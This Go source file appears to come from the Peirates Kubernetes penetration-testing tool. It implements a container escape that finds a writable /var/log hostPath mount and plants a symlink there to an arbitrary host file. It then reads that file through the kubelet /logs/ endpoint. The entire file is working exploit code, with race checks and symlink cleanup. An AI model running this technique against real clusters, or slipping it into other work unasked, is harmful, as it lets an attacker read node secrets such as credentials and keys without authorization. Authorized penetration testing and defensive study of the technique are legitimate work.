//go:build linux

package hostlog

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/inguardians/peirates/internal/modules/escapeutil"
	"golang.org/x/sys/unix"
)

const (
	procSelfMountInfo = "/proc/self/mountinfo"
	linkNamePrefix    = ".peirates-hostlog-"
	randomRunIDBytes  = 16
)

var runIDPattern = regexp.MustCompile(`^[a-f0-9]{24,64}$`)

type pathKind uint8

const (
	pathOther pathKind = iota
	pathDirectory
	pathSymlink
)

type linkIdentity struct {
	identity escapeutil.FileIdentity
	mode     uint32
}

type hostLogSystem interface {
	readFile(string) ([]byte, error)
	pathKind(string) (pathKind, error)
	accessPath(string) error
	openDirectoryNoFollow(string) (*os.File, escapeutil.FileIdentity, error)
	accessDirectory(*os.File) error
	lstatAt(*os.File, string) (linkIdentity, error)
	symlinkAt(string, *os.File, string) error
	readlinkAt(*os.File, string, int) (string, error)
	unlinkAt(*os.File, string) error
	randomBytes([]byte) (int, error)
}

type realHostLogSystem struct{}

func (realHostLogSystem) readFile(name string) ([]byte, error) { return os.ReadFile(name) }

func (realHostLogSystem) pathKind(name string) (pathKind, error) {
	info, err := os.Lstat(name)
	if err != nil {
		return pathOther, err
	}
	if info.Mode()&os.ModeSymlink != 0 {
		return pathSymlink, nil
	}
	if info.IsDir() {
		return pathDirectory, nil
	}
	return pathOther, nil
}

func (realHostLogSystem) accessPath(name string) error {
	return unix.Faccessat(unix.AT_FDCWD, name, unix.W_OK|unix.X_OK, unix.AT_EACCESS)
}

func (realHostLogSystem) openDirectoryNoFollow(name string) (*os.File, escapeutil.FileIdentity, error) {
	return escapeutil.OpenDirectoryNoFollow(name)
}

func (realHostLogSystem) accessDirectory(directory *os.File) error {
	return unix.Faccessat(int(directory.Fd()), ".", unix.W_OK|unix.X_OK, unix.AT_EACCESS)
}

func (realHostLogSystem) lstatAt(directory *os.File, name string) (linkIdentity, error) {
	var stat unix.Stat_t
	if err := unix.Fstatat(int(directory.Fd()), name, &stat, unix.AT_SYMLINK_NOFOLLOW); err != nil {
		return linkIdentity{}, err
	}
	return linkIdentity{
		identity: escapeutil.FileIdentity{Device: uint64(stat.Dev), Inode: stat.Ino},
		mode:     stat.Mode,
	}, nil
}

func (realHostLogSystem) symlinkAt(target string, directory *os.File, name string) error {
	return unix.Symlinkat(target, int(directory.Fd()), name)
}

func (realHostLogSystem) readlinkAt(directory *os.File, name string, maximum int) (string, error) {
	if maximum <= 0 {
		return "", fmt.Errorf("readlink buffer size must be positive")
	}
	buffer := make([]byte, maximum)
	read, err := unix.Readlinkat(int(directory.Fd()), name, buffer)
	if err != nil {
		return "", err
	}
	if read == len(buffer) {
		return "", fmt.Errorf("symlink target exceeds expected length")
	}
	return string(buffer[:read]), nil
}

func (realHostLogSystem) unlinkAt(directory *os.File, name string) error {
	return unix.Unlinkat(int(directory.Fd()), name, 0)
}

func (realHostLogSystem) randomBytes(buffer []byte) (int, error) { return rand.Read(buffer) }

func probePlatform(ctx context.Context) ([]escapeutil.Finding, error) {
	return probeWithSystem(ctx, realHostLogSystem{})
}

func probeWithSystem(ctx context.Context, system hostLogSystem) ([]escapeutil.Finding, error) {
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	finding := escapeutil.Finding{Technique: Technique}
	candidates, err := qualifiedCandidates(system)
	if err != nil {
		finding.Status = escapeutil.StatusBlocked
		finding.Summary = "host-log mount prerequisites could not be inspected: " + err.Error()
		return []escapeutil.Finding{finding}, nil
	}
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	if len(candidates) == 0 {
		finding.Status = escapeutil.StatusBlocked
		finding.Summary = "no writable direct mount rooted at /var/log with write and search access was found"
		return []escapeutil.Finding{finding}, nil
	}
	finding.Status = escapeutil.StatusCandidate
	if len(candidates) == 1 {
		finding.Summary = "one writable host-log mount is locally usable; kubelet endpoint access remains unproven"
	} else {
		finding.Summary = "multiple writable host-log mounts require explicit operator selection; kubelet endpoint access remains unproven"
	}
	for _, candidate := range candidates {
		if candidate.HostPathOriginUnproven {
			finding.Evidence = append(finding.Evidence,
				fmt.Sprintf("%s is a writable direct mount at the exact /var/log destination; mountinfo did not retain a /var/log root, so hostPath origin is unproven and kubelet path is /logs/",
					candidate.MountPoint))
			continue
		}
		finding.Evidence = append(finding.Evidence,
			fmt.Sprintf("%s maps writable node path %s below kubelet /logs/%s",
				candidate.MountPoint, candidate.Root, candidate.URLPrefix))
	}
	return []escapeutil.Finding{finding}, nil
}

func readFilePlatform(ctx context.Context, options Options) (Result, error) {
	return readFileWithSystem(ctx, options, realHostLogSystem{})
}

func readFileWithSystem(ctx context.Context, options Options, system hostLogSystem) (result Result, returnErr error) {
	if err := validateTargetPath(options.TargetPath); err != nil {
		return Result{}, err
	}
	if err := validateMountPoint(options.MountPoint); err != nil {
		return Result{}, err
	}
	if options.Fetcher == nil {
		return Result{}, fmt.Errorf("kubelet log fetcher is required")
	}
	runID, err := normalizedRunID(options.RunID, system)
	if err != nil {
		return Result{}, err
	}
	if err := ctx.Err(); err != nil {
		return Result{}, err
	}

	selected, err := selectCandidate(system, options.MountPoint)
	if err != nil {
		return Result{}, err
	}
	preflightDirectory, preflightIdentity, err := system.openDirectoryNoFollow(selected.MountPoint)
	if err != nil {
		return Result{}, fmt.Errorf("open host-log mount %s for preflight identity: %w", selected.MountPoint, err)
	}
	if err := system.accessDirectory(preflightDirectory); err != nil {
		_ = preflightDirectory.Close()
		return Result{}, fmt.Errorf("host-log mount %s is not writable and searchable before endpoint preflight: %w", selected.MountPoint, err)
	}
	if err := preflightDirectory.Close(); err != nil {
		return Result{}, fmt.Errorf("close host-log mount %s after preflight identity: %w", selected.MountPoint, err)
	}
	if err := options.Fetcher.Probe(ctx); err != nil {
		return Result{}, fmt.Errorf("probe kubelet log endpoint before filesystem mutation: %w", err)
	}
	if err := ctx.Err(); err != nil {
		return Result{}, err
	}

	// The endpoint probe may take long enough for mounts or permissions to
	// change, so qualify the exact candidate again immediately before opening it.
	rechecked, err := selectCandidate(system, options.MountPoint)
	if err != nil {
		return Result{}, fmt.Errorf("recheck host-log mount before mutation: %w", err)
	}
	if rechecked != selected {
		return Result{}, fmt.Errorf("host-log mount %s changed after endpoint preflight", selected.MountPoint)
	}

	directory, openedIdentity, err := system.openDirectoryNoFollow(selected.MountPoint)
	if err != nil {
		return Result{}, fmt.Errorf("open host-log mount %s without following symlinks: %w", selected.MountPoint, err)
	}
	defer directory.Close()
	if !openedIdentity.Equal(preflightIdentity) {
		return Result{}, fmt.Errorf("host-log mount %s directory identity changed after endpoint preflight", selected.MountPoint)
	}
	if err := system.accessDirectory(directory); err != nil {
		return Result{}, fmt.Errorf("host-log mount %s is not writable and searchable after opening: %w", selected.MountPoint, err)
	}
	if err := ctx.Err(); err != nil {
		return Result{}, err
	}

	linkName := linkNamePrefix + runID
	if _, err := system.lstatAt(directory, linkName); err == nil {
		return Result{}, fmt.Errorf("temporary host-log path already exists: %s", linkName)
	} else if !errors.Is(err, unix.ENOENT) {
		return Result{}, fmt.Errorf("inspect temporary host-log path %s: %w", linkName, err)
	}
	if err := system.symlinkAt(options.TargetPath, directory, linkName); err != nil {
		return Result{}, fmt.Errorf("create temporary host-log symlink: %w", err)
	}

	var createdIdentity *escapeutil.FileIdentity
	defer func() {
		cleanupErr := cleanupLink(system, directory, linkName, options.TargetPath, createdIdentity)
		if cleanupErr == nil {
			return
		}
		result = Result{}
		cleanupErr = fmt.Errorf("cleanup temporary host-log symlink %s: %w",
			filepath.Join(selected.MountPoint, linkName), cleanupErr)
		if returnErr == nil {
			returnErr = cleanupErr
			return
		}
		returnErr = errors.Join(cleanupErr, returnErr)
	}()

	created, target, err := inspectLink(system, directory, linkName, len(options.TargetPath)+1)
	if created.mode&unix.S_IFMT == unix.S_IFLNK {
		createdIdentity = &created.identity
	}
	if err != nil {
		return Result{}, fmt.Errorf("inspect created host-log symlink: %w", err)
	}
	if target != options.TargetPath {
		return Result{}, fmt.Errorf("temporary host-log symlink target changed after creation")
	}
	if err := ctx.Err(); err != nil {
		return Result{}, err
	}

	logPath := path.Join(selected.URLPrefix, linkName)
	content, err := options.Fetcher.Read(ctx, logPath)
	if err != nil {
		return Result{}, fmt.Errorf("read host file through kubelet log endpoint: %w", err)
	}
	if err := ctx.Err(); err != nil {
		return Result{}, err
	}
	return Result{
		MountPoint:             selected.MountPoint,
		HostLogRoot:            selected.Root,
		HostPathOriginUnproven: selected.HostPathOriginUnproven,
		LogPath:                logPath,
		Content:                content,
	}, nil
}

func qualifiedCandidates(system hostLogSystem) ([]escapeutil.HostLogMount, error) {
	data, err := system.readFile(procSelfMountInfo)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", procSelfMountInfo, err)
	}
	mounts, err := escapeutil.ParseMountInfo(data)
	if err != nil {
		return nil, fmt.Errorf("parse %s: %w", procSelfMountInfo, err)
	}
	var qualified []escapeutil.HostLogMount
	for _, candidate := range escapeutil.HostLogCandidates(mounts) {
		kind, kindErr := system.pathKind(candidate.MountPoint)
		if kindErr != nil || kind != pathDirectory {
			continue
		}
		if err := system.accessPath(candidate.MountPoint); err != nil {
			continue
		}
		qualified = append(qualified, candidate)
	}
	return qualified, nil
}

func selectCandidate(system hostLogSystem, explicit string) (escapeutil.HostLogMount, error) {
	candidates, err := qualifiedCandidates(system)
	if err != nil {
		return escapeutil.HostLogMount{}, err
	}
	if explicit != "" {
		var matches []escapeutil.HostLogMount
		for _, candidate := range candidates {
			if candidate.MountPoint == explicit {
				matches = append(matches, candidate)
			}
		}
		switch len(matches) {
		case 0:
			return escapeutil.HostLogMount{}, fmt.Errorf("selected host-log mount %s did not pass qualification", explicit)
		case 1:
			return matches[0], nil
		default:
			return escapeutil.HostLogMount{}, fmt.Errorf("selected host-log mount %s maps multiple node log roots", explicit)
		}
	}
	switch len(candidates) {
	case 0:
		return escapeutil.HostLogMount{}, fmt.Errorf("no writable direct host-log mount passed qualification")
	case 1:
		return candidates[0], nil
	default:
		mountPoints := make([]string, 0, len(candidates))
		for _, candidate := range candidates {
			mountPoints = append(mountPoints, candidate.MountPoint)
		}
		return escapeutil.HostLogMount{}, fmt.Errorf("multiple host-log mounts require explicit selection: %s", strings.Join(mountPoints, ", "))
	}
}

func validateTargetPath(target string) error {
	if target == "" {
		return fmt.Errorf("absolute host target path is required")
	}
	if !filepath.IsAbs(target) {
		return fmt.Errorf("host target path %q must be absolute", target)
	}
	cleaned := filepath.Clean(target)
	if cleaned != target {
		return fmt.Errorf("host target path %q is not normalized; use %q", target, cleaned)
	}
	if cleaned == string(filepath.Separator) {
		return fmt.Errorf("host target path must name one file and must not be filesystem root")
	}
	return nil
}

func validateMountPoint(mountPoint string) error {
	if mountPoint == "" {
		return nil
	}
	if !filepath.IsAbs(mountPoint) {
		return fmt.Errorf("host-log mount point %q must be absolute", mountPoint)
	}
	if cleaned := filepath.Clean(mountPoint); cleaned != mountPoint {
		return fmt.Errorf("host-log mount point %q is not normalized; use %q", mountPoint, cleaned)
	}
	return nil
}

func normalizedRunID(explicit string, system hostLogSystem) (string, error) {
	if explicit != "" {
		if !runIDPattern.MatchString(explicit) {
			return "", fmt.Errorf("run ID must contain 24-64 lowercase hexadecimal characters")
		}
		return explicit, nil
	}
	buffer := make([]byte, randomRunIDBytes)
	read, err := system.randomBytes(buffer)
	if err != nil {
		return "", fmt.Errorf("generate cryptographic run ID: %w", err)
	}
	if read != len(buffer) {
		return "", fmt.Errorf("generate cryptographic run ID: read %d of %d random bytes", read, len(buffer))
	}
	return hex.EncodeToString(buffer), nil
}

func inspectLink(system hostLogSystem, directory *os.File, name string, maximumTargetLength int) (linkIdentity, string, error) {
	identity, err := system.lstatAt(directory, name)
	if err != nil {
		return linkIdentity{}, "", err
	}
	if identity.mode&unix.S_IFMT != unix.S_IFLNK {
		return identity, "", fmt.Errorf("temporary path is not a symlink")
	}
	target, err := system.readlinkAt(directory, name, maximumTargetLength)
	if err != nil {
		return identity, "", err
	}
	return identity, target, nil
}

func cleanupLink(system hostLogSystem, directory *os.File, name, expectedTarget string, expectedIdentity *escapeutil.FileIdentity) error {
	if expectedIdentity == nil {
		return fmt.Errorf("created symlink identity is unavailable; refusing to unlink %s", name)
	}
	current, target, err := inspectLink(system, directory, name, len(expectedTarget)+1)
	if err != nil {
		return fmt.Errorf("verify owned symlink %s: %w", name, err)
	}
	if !current.identity.Equal(*expectedIdentity) {
		return fmt.Errorf("temporary symlink %s was replaced; refusing to unlink it", name)
	}
	if target != expectedTarget {
		return fmt.Errorf("temporary symlink %s changed target; refusing to unlink it", name)
	}
	if err := system.unlinkAt(directory, name); err != nil {
		return fmt.Errorf("unlink owned symlink %s: %w", name, err)
	}
	return nil
}
